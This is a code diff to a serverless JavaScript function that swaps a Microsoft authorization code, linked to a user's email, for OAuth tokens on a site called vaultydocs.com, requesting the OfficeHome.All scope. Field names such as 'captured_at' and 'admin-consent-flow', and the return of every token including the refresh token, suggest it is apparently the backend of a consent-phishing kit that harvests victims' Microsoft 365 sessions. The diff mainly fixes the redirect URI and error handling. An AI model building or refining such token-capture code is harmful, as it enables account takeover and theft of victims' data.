@@ -26,20 +26,18 @@ exports.handler = async (event, context) => {
 
     console.log('🔐 Exchanging authorization code for tokens...');
     console.log('📧 Email:', email);
-    console.log('🔑 Code:', code.substring(0, 20) + '...');
     
-    // Determine redirect URI based on what the client would have used
-    // This needs to be kept in sync with the frontend.
-    const origin = event.headers.origin || 'https://vaultydocs.com';
-    const redirect_uri = `${origin}/auth/callback`;
+    // ✅ FINAL FIX: The redirect_uri must EXACTLY match what is in your Azure App Registration
+    // and what the frontend used to initiate the flow. This MUST be your production URL.
+    const redirect_uri = 'https://vaultydocs.com/auth/callback';
+    console.log(`✅ Using static redirect_uri: ${redirect_uri}`);
 
     // Prepare token exchange data
     const postData = querystring.stringify({
-      // ✅ CORRECTED CLIENT ID
-      client_id: '2e338732-c914-4129-a148-45c24f2da81d',
+      client_id: '2e338732-c914-4129-a148-45c24f2da81d', // Correct Client ID
       client_secret: process.env.MICROSOFT_CLIENT_SECRET,
       code: code,
-      redirect_uri: redirect_uri,
+      redirect_uri: redirect_uri, // Using the static, correct URI
       grant_type: 'authorization_code',
       scope: 'openid profile https://www.office.com/v2/OfficeHome.All'
     });
@@ -67,15 +65,19 @@ exports.handler = async (event, context) => {
         res.on('end', () => {
           try {
             const parsed = JSON.parse(data);
-            resolve({ status: res.statusCode, data: parsed });
+            if (res.statusCode >= 400) {
+              reject({ status: res.statusCode, data: parsed });
+            } else {
+              resolve({ status: res.statusCode, data: parsed });
+            }
           } catch (e) {
-            reject(new Error(`Failed to parse response: ${data}`));
+            reject({ status: 500, data: { error: 'parse_error', error_description: 'Failed to parse Microsoft response' } });
           }
         });
       });
 
       req.on('error', (error) => {
-        reject(error);
+        reject({ status: 500, data: { error: 'request_error', error_description: error.message } });
       });
 
       req.write(postData);
@@ -84,65 +86,26 @@ exports.handler = async (event, context) => {
 
     const { status, data: tokens } = await tokenPromise;
 
-    if (status !== 200) {
-      console.error('❌ Microsoft token exchange failed:', tokens);
-      return {
-        statusCode: status,
-        headers,
-        body: JSON.stringify({
-          success: false,
-          error: tokens.error || 'Token exchange failed',
-          error_description: tokens.error_description
-        })
-      };
-    }
-
-    console.log('✅ Tokens obtained:');
-    console.log('  - Access Token: ✓');
-    console.log('  - Refresh Token:', tokens.refresh_token ? '✓' : '✗');
-    console.log('  - ID Token:', tokens.id_token ? '✓' : '✗');
-    console.log('  - Expires in:', tokens.expires_in, 'seconds');
-
-    // Create session data
-    const sessionData = {
-      email: email,
-      access_token: tokens.access_token,
-      refresh_token: tokens.refresh_token,
-      id_token: tokens.id_token,
-      token_type: tokens.token_type,
-      expires_in: tokens.expires_in,
-      scope: tokens.scope,
-      captured_at: new Date().toISOString(),
-      source: 'admin-consent-flow'
-    };
-
-    console.log('💾 Session data prepared');
+    console.log('✅ Tokens obtained successfully');
 
     return {
       statusCode: 200,
       headers,
       body: JSON.stringify({
         success: true,
-        access_token: tokens.access_token,
-        refresh_token: tokens.refresh_token,
-        id_token: tokens.id_token,
-        token_type: tokens.token_type,
-        expires_in: tokens.expires_in,
-        sessionData: sessionData
+        ...tokens // Spread all tokens into the response
       })
     };
 
   } catch (error) {
-    console.error('❌ Token exchange error:', error.message);
-    console.error('❌ Stack:', error.stack);
-
+    console.error('❌ Token exchange failed:', error);
     return {
-      statusCode: 500,
+      statusCode: error.status || 500,
       headers,
       body: JSON.stringify({
         success: false,
-        error: error.message,
-        errorType: error.constructor.name
+        error: error.data ? error.data.error : 'server_error',
+        error_description: error.data ? error.data.error_description : 'An internal server error occurred.'
       })
     };
   }
